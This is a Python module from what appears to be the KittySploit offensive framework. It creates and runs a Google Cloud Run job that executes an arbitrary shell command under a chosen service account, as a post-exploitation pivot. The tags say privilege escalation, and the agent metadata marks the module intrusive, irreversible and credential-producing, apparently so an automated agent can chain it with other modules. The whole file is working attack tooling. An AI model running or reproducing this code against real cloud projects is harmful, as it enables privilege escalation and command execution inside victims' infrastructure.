#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import json
import re
import time

from kittysploit import *
from lib.post.gcp import GcpPostMixin


class Module(Post, GcpPostMixin):
    __info__ = {
        "name": "GCP Cloud Run Deploy Command Pivot",
        "description": "Create and run a Cloud Run job that executes an arbitrary command under a chosen identity",
        "author": "KittySploit Team",
        "session_type": SessionType.GCP_API,
        "tags": ["gcp", "cloud", "cloud-run", "pivot", "privilege-escalation"],
    'agent': {
        'risk': 'intrusive',
        'effects': ['configuration_change', 'active_exploitation', 'api_request'],
        'expected_requests': 3,
        'reversible': False,
        'approval_required': True,
        'produces': ['credentials', 'risk_signals'],
        'cost': 1.5,
        'noise': 0.5,
        'value': 1.0,
        'requires':         {'min_endpoints': 0,
         'min_params': 0,
         'tech_hints_any': [],
         'tech_hints_all': [],
         'specializations_any': [],
         'risk_signals_any': [],
         'auth_session': False,
         'capabilities_any': [],
         'capabilities_all': [],
         'confidence_min': {},
         'confidence_min_any': {},
         'endpoint_pattern_any': [],
         'param_any': [],
         'api_surface_ready': False},
        'chain':         {'produces_capabilities': [{'capability': 'db_access', 'from_detail': ''},
                                   {'capability': 'db_access', 'from_detail': ''}],
         'consumes_capabilities': ['shell'],
         'option_bindings': {},
         'suggested_followups': []},
    },
    }

    location = OptString("", "Cloud Run region, for example europe-west1", True)
    command = OptString("", "Shell command to execute in the Cloud Run job container", True)
    job_name = OptString("", "Cloud Run job name; auto-generated when empty", False)
    service_account_email = OptString("", "Service account identity for the job execution", False)
    image = OptString("gcr.io/google.com/cloudsdktool/cloud-sdk:slim", "Container image for the job", False)
    timeout_seconds = OptInteger(300, "Job task timeout in seconds", False)
    run_job = OptBool(True, "Execute the job immediately after creation", False)
    wait_seconds = OptInteger(5, "Seconds to wait after job submission", False)
    export_json = OptString("", "Optional output JSON file", False)

    def run(self):
        try:
            project_id = self._gcp_project_id()
            location = str(self.location or "").strip()
            command = str(self.command or "").strip()
            if not project_id:
                print_error("Could not resolve project_id from session")
                return False
            if not command:
                print_error("command is required")
                return False

            job_name = str(self.job_name or "").strip() or self._default_job_name()
            sa = str(self.service_account_email or "").strip()
            print_info(f"Creating Cloud Run job {job_name} in {location}...")
            created = self._gcp_create_cloud_run_job(
                project_id,
                location,
                job_name,
                image=str(self.image or "gcr.io/google.com/cloudsdktool/cloud-sdk:slim"),
                command=command,
                service_account=sa,
                timeout_seconds=int(self.timeout_seconds or 300),
            )
            if not created.get("ok"):
                print_error(f"Cloud Run job creation failed: {created.get('error', '')}")
                return False

            job = created.get("job") or {}
            job_resource = str(job.get("name") or "")
            print_success(f"Cloud Run job created: {job_resource or job_name}")

            execution = None
            if self.run_job:
                print_info("Starting Cloud Run job execution...")
                run_result = self._gcp_run_cloud_run_job(project_id, location, job_resource or job_name)
                if not run_result.get("ok"):
                    print_error(f"Cloud Run job execution failed: {run_result.get('error', '')}")
                    return False
                execution = run_result.get("execution") or {}
                print_success(f"Execution started: {execution.get('name', 'unknown')}")

            wait_s = max(0, int(self.wait_seconds or 0))
            if wait_s:
                time.sleep(wait_s)

            output = {
                "project_id": project_id,
                "location": location,
                "job_name": job_name,
                "job": job,
                "service_account_email": sa,
                "command": command,
                "execution": execution,
            }
            if self.export_json:
                exported = self._gcp_export_json(str(self.export_json or ""), output)
                if exported:
                    print_success(f"Results exported to {exported}")

            return self.module_result(success=True, data=output)
        except Exception as exc:
            print_error(f"Cloud Run command pivot failed: {exc}")
            return False

    def _default_job_name(self):
        principal = self._gcp_client_email() or "kitty"
        slug = re.sub(r"[^a-z0-9-]", "-", principal.split("@", 1)[0].lower())
        slug = re.sub(r"-+", "-", slug).strip("-")[:20] or "kitty"
        suffix = str(int(time.time()))[-6:]
        return f"ks-{slug}-{suffix}"
